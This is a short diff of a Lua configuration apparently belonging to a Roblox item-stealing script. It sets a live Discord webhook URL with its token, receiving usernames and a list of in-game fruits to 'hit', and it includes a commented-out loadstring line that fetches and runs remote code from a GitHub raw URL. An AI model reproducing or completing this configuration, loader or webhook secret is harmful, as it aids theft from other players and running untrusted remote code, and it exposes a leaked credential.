@@ -1,6 +1,6 @@
     Webhook = "https://discord.com/api/webhooks/1362830489416634660/tcqmYBhzMKWY_MdSdJdnchayOww7oucuf0QtVefHXMYjb4P8OfUQIOMXFHH1EDO6OlRd" -- << Your Webhook
     Usernames = {"Cuttay200_1", "somealtuserhere2"} -- << Your username(-s).
-    FruitsToHit = {"Venom-Venom", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+    FruitsToHit = {} -- << Fruits you want
     
     -- loadstring(game:HttpGet("https://raw.githubusercontent.com/scripter3000/test/refs/heads/main/f"))() -- Removed: First external loadstring
     
